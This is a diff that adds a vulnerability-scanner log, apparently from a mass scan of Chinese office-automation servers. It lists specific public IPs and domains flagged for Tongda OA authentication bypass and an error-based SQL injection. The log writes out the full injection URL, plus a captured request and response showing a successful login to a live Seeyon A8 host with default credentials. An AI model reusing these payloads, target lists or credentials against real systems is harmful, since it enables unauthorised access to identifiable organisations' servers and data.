@@ -1,0 +1,43 @@
+[high] [tongda-oa-interface-ugo-sqli] http://39.183.165.56:8081/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
+http://st.chenhong.group:88 |👀| tongda;Tongda-icon
+[high] [tongdaoa-auth-bypass] http://221.12.132.134:88/general/index.php
+[high] [tongdaoa-auth-bypass] http://112.11.202.22:88/general/index.php
+[high] [tongdaoa-auth-bypass] http://122.225.126.154:7788/general/index.php
+[high] [tongdaoa-auth-bypass] http://220.189.237.18:88/general/index.php
+[high] [tongdaoa-auth-bypass] http://61.153.53.134:8090/general/index.php
+[high] [tongdaoa-auth-bypass] http://39.183.165.56:8081/general/index.php
+http://url.cndingli.com:88 |👀| tongda;Tongda-icon
+[high] [tongdaoa-auth-bypass] http://st.chenhong.group:88/general/index.php
+[high] [tongdaoa-auth-bypass] http://url.cndingli.com:88/general/index.php
+http://oa.chinajinzhou.com:88 |👀| tongda;Tongda-icon
+
+
+
+
+[high] [seeyon-a8-default-login] http://220.189.233.42:8086/seeyon/rest/authentication/ucpcLogin
+============================  请求数据包 ================================
+POST /seeyon/rest/authentication/ucpcLogin HTTP/1.1
+Host: 220.189.233.42:8086
+User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Content-Length: 75
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+UserAgentFrom=iphone&login_username=audit-admin&login_password=seeyon123456
+============================  请求响应包 ================================
+HTTP/1.1 200 
+Connection: close
+Content-Length: 42
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: origin, content-type, accept, authorization
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, HEAD
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: LoginOK,LoginError
+Content-Type: application/json;charset=UTF-8
+Date: Thu, 25 Dec 2025 02:36:50 GMT
+Loginok: ok
+Server: SY8045
+Set-Cookie: JSESSIONID=0F8D5187F1F4F4085AD1C350D57B88F3; Path=/seeyon; HttpOnly
+
+{"LoginOK":"ok","loginName":"audit-admin"}
+========================================================================
